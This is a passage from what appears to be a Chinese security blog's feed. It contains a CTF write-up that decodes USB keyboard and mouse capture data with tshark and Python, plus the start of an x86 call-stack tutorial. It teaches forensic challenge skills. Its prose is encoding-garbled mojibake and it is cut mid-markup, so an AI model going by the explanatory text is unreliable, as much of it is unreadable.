class="token punctuation">:</span> <span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span>            <span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> \                line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="é¼ æ ‡æµé‡"><a href="#é¼ æ ‡æµé‡" class="headerlink" title="é¼ æ ‡æµé‡"></a>é¼ æ ‡æµé‡</h2><blockquote><p><strong>é¼ æ ‡æµé‡çš„æ•°æ®é•¿åº¦ä¸º 4 ä¸ªå­—èŠ‚</strong>ï¼Œé›†ä¸­åœ¨ <code>Leftover Capture Data</code> åŸŸçš„ç¬¬ 3 ä¸ªå­—èŠ‚ä¸­</p><ol><li>ç¬¬ 1 ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é”®ï¼Œå½“å– 0x00 æ—¶ï¼Œä»£è¡¨æ²¡æœ‰æŒ‰é”®ï¼›ä¸º 0x01 æ—¶ï¼Œä»£è¡¨æŒ‰å·¦é”®ï¼Œä¸º 0x02 æ—¶ï¼Œä»£è¡¨æŒ‰å³é”®</li><li>ç¬¬ 2 ä¸ªå­—èŠ‚å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ª signed byte ç±»å‹ï¼Œå…¶æœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œå½“è¿™ä¸ªå€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨é¼ æ ‡æ°´å¹³å³ç§»å¤šå°‘åƒç´ ï¼Œä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨æ°´å¹³å·¦ç§»å¤šå°‘åƒç´ </li><li>ç¬¬ 3 ä¸ªå­—èŠ‚ä¸ç¬¬ 2 å­—èŠ‚ç±»ä¼¼ï¼Œä»£è¡¨å‚ç›´ä¸Šä¸‹ç§»åŠ¨å¤šå°‘åƒç´ </li></ol></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%9011.png" alt="CTF-Misc_æµé‡åˆ†æ11.png"></p><p>ä¸é”®ç›˜æµé‡ç±»ä¼¼ï¼Œé¦–å…ˆä½¿ç”¨ <code>tshark</code> æå–é¼ æ ‡æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> usb2.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">></span> usbdata.txttshark <span class="token parameter variable">-r</span> usb2.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt <span class="token comment">#æå–å¹¶å»é™¤ç©ºè¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœæå–å‡ºæ¥çš„æ•°æ®æ²¡æœ‰åŠ å†’å·ï¼Œä½¿ç”¨è„šæœ¬æ·»åŠ ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>fi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token comment"># å¦‚æœæ˜¯é”®ç›˜æµé‡ len æ”¹ä¸º 16</span>            out <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•ä¿¡æ¯éšè—ä½ç½®ï¼Œæ ¹æ®è„šæœ¬ä¸­ <code>btn_flag</code> å–ä½•å€¼æ—¶èƒ½å¾—åˆ°ä¸€ç³»åˆ—åæ ‡æ¥åˆ¤æ–­ä¿¡æ¯éšè—åœ¨é¼ æ ‡å·¦é”®è¿˜æ˜¯å³é”®ä¸­ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'xy.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>posx <span class="token operator">=</span> <span class="token number">0</span>posy <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">12</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        x <span class="token operator">-=</span> <span class="token number">256</span>    <span class="token keyword">if</span> y <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        y <span class="token operator">-=</span> <span class="token number">256</span>    posx <span class="token operator">+=</span> x    posy <span class="token operator">+=</span> y    btn_flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 1 for left , 2 for right , 0 for nothing</span>    <span class="token keyword">if</span> btn_flag <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">:</span> <span class="token comment"># 1 ä»£è¡¨å·¦é”®</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posx<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posy<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ <code>gnuplot</code> å°† xy.txt é‡Œçš„åæ ‡è½¬åŒ–æˆå›¾åƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gnuplotgnuplot<span class="token operator">></span> plot <span class="token string">"xy.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰å®‰è£… <code>gnuplot</code> æ‰‹åŠ¨å®‰è£…å³å¯ï¼ˆéœ€è¦åŒæ—¶å®‰è£… <code>gnuplot</code> å’Œ <code>gnuplot-x11</code> æ‰èƒ½ç”»å‡ºå›¾ï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gnuplot gnuplot-x11gnuplot <span class="token parameter variable">-v</span>   <span class="token comment"># éªŒè¯å®‰è£…</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Windows ç‰ˆ <code>gnuplot</code> ä¸‹è½½åœ°å€ï¼š<a href="http://www.gnuplot.info/">gnuplot homepage</a></p><hr>]]></content>
    
    
    <summary type="html">CTF æ‚é¡¹ä¸­æµé‡åˆ†æç›¸å…³çš„çŸ¥è¯†ç§¯ç´¯</summary>
    
    
    
    <category term="å®‰å…¨æ‚é¡¹" scheme="https://www.uf4te.cn/categories/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Misc" scheme="https://www.uf4te.cn/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>å‡½æ•°è°ƒç”¨æ ˆ</title>
    <link href="https://www.uf4te.cn/posts/c68710a5.html"/>
    <id>https://www.uf4te.cn/posts/c68710a5.html</id>
    <published>2023-12-05T16:00:00.000Z</published>
    <updated>2024-06-05T06:37:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°è°ƒç”¨æ ˆ"><a href="#å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="å‡½æ•°è°ƒç”¨æ ˆ"></a>å‡½æ•°è°ƒç”¨æ ˆ</h1><blockquote><p>ä»¥ 32 ä½ç¨‹åºçš„å¯„å­˜å™¨ä¸ºä¾‹</p></blockquote><p>åœ¨å­¦æ±‡ç¼–æ—¶æˆ‘ä»¬çŸ¥é“ï¼Œå‡½æ•°è°ƒç”¨é€šå¸¸æœ‰å¦‚ä¸‹å†™æ³•ï¼š</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 20h   <span class="token comment">; å‡è®¾è¿™ä¸­é—´çš„è¿›æ ˆæ“ä½œä½¿ esp å‡äº† 20h</span>...call fun...leaveretfun:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 30h   <span class="token comment">; å‡è®¾è¿™ä¸­é—´çš„è¿›æ ˆæ“ä½œä½¿ esp å‡äº† 30h</span>...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹åº” C è¯­è¨€ä¸­çš„ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å…³äºç†è§£å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸»è¦è¦æŠ“ä½ ESPã€EBPã€EIP è¿™ä¸‰ä¸ªå¯„å­˜å™¨çš„å˜åŒ–</p><p><strong>æ³¨æ„ï¼šå­¦ä¹ è¿™é‡Œå¿…é¡»è¦åˆ†æ¸…åœ°å€å’Œåœ°å€ä¸­å­˜æ”¾çš„å€¼ï¼Œè¿™ä¸¤è€…æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸ç„¶å®¹æ˜“æ‡µ</strong></p><p><strong>å°±åƒ C è¯­è¨€ä¸­æŒ‡é’ˆ p æŒ‡å‘çš„æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåœ°å€ï¼›è€Œ <code>*p</code> æŒ‡çš„æ˜¯è¿™ä¸ªå†…å­˜å•å…ƒä¸­å­˜æ”¾çš„æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªå€¼</strong></p></blockquote><h2 id="æ‰§è¡Œ-main-å‡½æ•°"><a href="#æ‰§è¡Œ-main-å‡½æ•°" class="headerlink" title="æ‰§è¡Œ main å‡½æ•°"></a>æ‰§è¡Œ main å‡½æ•°</h2><p>é¦–å…ˆæ¥çœ‹ main å‡½æ•°ï¼š</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 20h   <span class="token comment">; å‡è®¾è¿™ä¸­é—´çš„è¿›æ ˆæ“ä½œä½¿ esp å‡äº† 20h</span>...call fun...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>åœ¨æ‰§è¡Œ <code>push ebp</code> æ—¶ï¼Œå‡è®¾åˆå§‹ ESP æŒ‡å‘ <code>0xffffce2c</code> åœ°å€å¤„ï¼Œé¦–å…ˆ <code>esp = esp - 4</code>ï¼Œå†å°†åŸæœ¬ EBP çš„å€¼ <code>push</code> åˆ° ESP æ‰€æŒ‡å‘çš„ <code>0xffffce28</code> åœ°å€å¤„</p></li><li><p>åœ¨æ‰§è¡Œ <code>mov ebp, esp</code> æ—¶ï¼Œå°† ESP çš„å€¼èµ‹å€¼ç»™ EBPï¼Œå³ï¼šè®© EBP æŒ‡å‘å½“å‰ ESP æ‰€åœ¨åœ°å€ï¼Œæ•…æ­¤æ—¶ ESP å’Œ EBP éƒ½æŒ‡å‘ <code>0xffffce28</code> åœ°å€å¤„</p></li><li><p>åœ¨æ‰§è¡Œ <code>sub esp, 20h</code> æ—¶ï¼Œè¿™é‡Œå‡è®¾æ˜¯åœ¨æ¨¡æ‹Ÿå‡½æ•°ä¸­çš„å„ç§è¿›æ ˆæ“ä½œï¼Œä½¿å¾— ESP æŒ‡å‘ <code>0xffffce08</code> åœ°å€å¤„ï¼Œè€Œ EBP ä¸ä¼šéšç€è¿›æ ˆè€Œæ”¹å˜</p></li></ol><p>æ‰§è¡Œåˆ°è¿™é‡Œï¼Œæ ˆä¸­çš„å˜åŒ–å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%881.png" alt="å‡½æ•°è°ƒç”¨æ ˆ1.png"></p><ol start="4"><li>å½“æ‰§è¡Œ <code>call fun</code> æ—¶ï¼Œ<code>call</code> æŒ‡ä»¤ç›¸å½“äºï¼š</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push eipjmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>EIP å°±æ˜¯ <code>call fun</code> è¿™æ¡æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</p><p>é¦–å…ˆ <code>esp = esp - 4</code>ï¼Œå†å°† <code>call fun</code> è¿™æ¡æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å¡«åˆ° ESP æ‰€æŒ‡å‘çš„ <code>0xffffce04</code> åœ°å€å¤„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%882.png" alt="å‡½æ•°è°ƒç”¨æ ˆ2.png"></p><hr><h2 id="è·³è½¬åˆ°-fun-å‡½æ•°"><a href="#è·³è½¬åˆ°-fun-å‡½æ•°" class="headerlink" title="è·³è½¬åˆ° fun å‡½æ•°"></a>è·³è½¬åˆ° fun å‡½æ•°</h2><p>ç„¶åæ¥çœ‹ fun å‡½æ•°ï¼š</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">fun:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 30h   <span class="token comment">; å‡è®¾è¿™ä¸­é—´çš„è¿›æ ˆæ“ä½œä½¿ esp å‡äº† 30h</span>...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>fun ä¸­çš„æŒ‡ä»¤ä¸€ç›´æ‰§è¡Œåˆ° <code>sub esp, 30h</code> éƒ½ä¸ main ä¸­å¼€å§‹æ—¶ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ï¼š</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%883.png" alt="å‡½æ•°è°ƒç”¨æ ˆ3.png"></p><ol start="6"><li>å½“ fun å‡½æ•°çš„åŠŸèƒ½æ‰§è¡Œå®Œåï¼Œä¼šæ‰§è¡Œ <code>leave</code> æŒ‡ä»¤ï¼Œ<code>leave</code> æŒ‡ä»¤ç›¸å½“äºï¼š</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov esp<span class="token punctuation">,</span> ebp  <span class="token comment">; æ¢å¤æ ˆæŒ‡é’ˆ</span>pop ebp       <span class="token comment">; æ¢å¤åŸºå€æŒ‡é’ˆ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼š</p><p>åœ¨å‡½æ•°å¼€å§‹æ—¶</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push ebp  mov ebp<span class="token punctuation">,</span> esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ä¸¤æ¡æŒ‡ä»¤å…¶å®å¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ª <code>enter</code> æŒ‡ä»¤ï¼Œä»–ä»¬æ˜¯ç­‰ä»·çš„</p><p><strong><code>enter</code> æŒ‡ä»¤ä¸ <code>leave</code> æŒ‡ä»¤çš„æ“ä½œæ­£å¥½ç›¸åï¼Œ<code>enter</code> æŒ‡ä»¤ä½äºå‡½æ•°çš„å¼€å§‹ï¼Œ<code>leave</code> æŒ‡ä»¤ä½äºå‡½æ•°çš„ç»“å°¾ï¼Œç”¨æ¥æ¢å¤æ ˆå¸§</strong></p></blockquote><p>æ‰§è¡Œ <code>mov esp, ebp</code> åï¼Œä¼šå°† EBP çš„å€¼èµ‹å€¼ç»™ ESPï¼Œæ­¤æ—¶ ESP ä¼šå›åˆ° EBP æ‰€æŒ‡å‘çš„åœ°å€ <code>0xffffce00</code> å¤„</p><p>æ‰§è¡Œ <code>pop ebp</code> åï¼Œä¼šå…ˆå°† ESP æ‰€æŒ‡å‘çš„åœ°å€ <code>0xffffce00</code> ä¸­å­˜æ”¾çš„æ•°æ® <code>0xffffce28</code> å‡ºæ ˆé€å…¥ EBPï¼Œå› æ­¤è¿™æ—¶ EBP ä¼šæŒ‡å‘ <code>0xffffce28</code> åœ°å€å¤„ï¼›ç„¶åï¼Œç”±äºå‡ºæ ˆçš„ pop æ“ä½œä½¿å¾— <code>esp = esp + 4</code>ï¼Œå› æ­¤æ‰§è¡Œ <code>pop ebp</code> å ESP æŒ‡å‘ <code>0xffffce04</code> åœ°å€å¤„</p><p><img 